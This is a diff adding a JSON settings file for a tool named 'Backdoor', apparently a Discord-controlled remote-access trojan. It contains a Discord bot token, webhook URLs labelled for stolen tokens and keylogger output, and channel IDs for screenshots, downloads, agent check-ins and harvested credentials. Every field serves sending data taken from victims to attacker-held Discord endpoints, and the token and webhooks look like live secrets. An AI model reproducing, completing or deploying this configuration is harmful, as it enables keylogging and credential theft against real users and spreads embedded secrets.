@@ -1,0 +1,13 @@
+{
+    "settings":{
+        "backdoor-name": "Backdoor",
+        "bot-token": "OTU3OTA1ODY5NjU4NTUwMjky.YkFlXA.eGYBxG7s6OVr5_ofBF3vHgVxx4Q",
+        "token-webhook": "https://discord.com/api/webhooks/957905756953411675/uq1DnjekRKCoUSoaUfkMXsd4IcO6JpmVHd3rl3VjkFRtUPcEzsJ0jJP8nOyAVu0i9Klu",
+        "keylogger-webhook": "https://discord.com/api/webhooks/957905663378472990/e15g5vcSxslGR-Ywln73bwpNzsCLqLhkewv9BO3wlcGgmO5fhXY35Uq_aJ2Cu7rHl0R7",
+        "screenshots-id": "957905580050223110",
+        "downloads-id": "957905580050223112",
+        "agent-online-id": "957905580050223106",
+        "credentials-id": "957905580050223111",
+        "auto-keylogger": "False"
+    }
+}
